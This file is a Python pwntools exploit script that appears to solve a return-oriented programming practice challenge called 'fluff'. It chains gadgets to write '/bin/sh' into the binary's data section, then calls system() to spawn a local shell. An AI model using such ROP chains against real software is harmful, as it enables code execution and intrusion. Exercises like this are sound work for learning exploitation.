from pwn import *

#[Sections]
#Nm Paddr       Size Vaddr      Memsz Perms Name
#19 0x00000e10     8 0x00600e10     8 -rw- .init_array
#20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
#21 0x00000e20     8 0x00600e20     8 -rw- .jcr
#22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
#23 0x00000ff8     8 0x00600ff8     8 -rw- .got
#24 0x00001000    80 0x00601000    80 -rw- .got.plt
#25 0x00001050    16 0x00601050    16 -rw- .data
#26 0x00001060     0 0x00601060    48 -rw- .bss
write_to = 0x00601050

# xor r11, r11; pop r14; mov edi, 0x601050; ret;
xor_r11_r11 = 0x00400822
# xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xor_r11_r12 = 0x0040082f

# xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
xchg_r11_r10 = 0x00400840

# 0x004008c3: pop rdi; ret;
pop_rdi = 0x004008c3
# 0x004008bc: pop r12; pop r13; pop r14; pop r15; ret;
pop_r12 = 0x004008bc

# 0x0040084e: mov qword [r10], r11; pop r13; pop r12; xor byte [r10], r12b; ret;
mov_r11_r10_ptr = 0x0040084e

def load_address(address):
    # r12 -> r11
    rop_chain = p64(pop_r12)
    rop_chain += p64(address)
    rop_chain += "\x00"*8
    rop_chain += "\x00"*8
    rop_chain += "\x00"*8
    rop_chain += p64(xor_r11_r11)
    rop_chain += "\x00"*8
    rop_chain += p64(xor_r11_r12)
    rop_chain += "\x00"*8
    # r11 -> r10
    rop_chain += p64(xchg_r11_r10)
    rop_chain += "\x00"*8

    return rop_chain

def load_string(string):
    # r12 -> r11
    rop_chain = p64(pop_r12)
    rop_chain += string
    rop_chain += "\x00"*8
    rop_chain += "\x00"*8
    rop_chain += "\x00"*8
    rop_chain += p64(xor_r11_r11)
    rop_chain += "\x00"*8
    rop_chain += p64(xor_r11_r12)
    rop_chain += "\x00"*8

    return rop_chain

def write_address():
    # write into address
    rop_chain = p64(mov_r11_r10_ptr)
    rop_chain += "\x00"*8
    rop_chain += "\x00"*8
    return rop_chain    

fluff = ELF('fluff')

rop_chain = "Z"*40
# Prime registers
rop_chain += load_address(write_to)
rop_chain += load_string("/bin/sh\x00")
rop_chain += write_address()

# 0x004005e0    1 6            sym.imp.system
rop_chain += p64(pop_rdi)
rop_chain += p64(write_to)
rop_chain += p64(0x004005e0)

p = process(fluff.path)
p.recvuntil('> ')
p.sendline(rop_chain)
p.interactive()
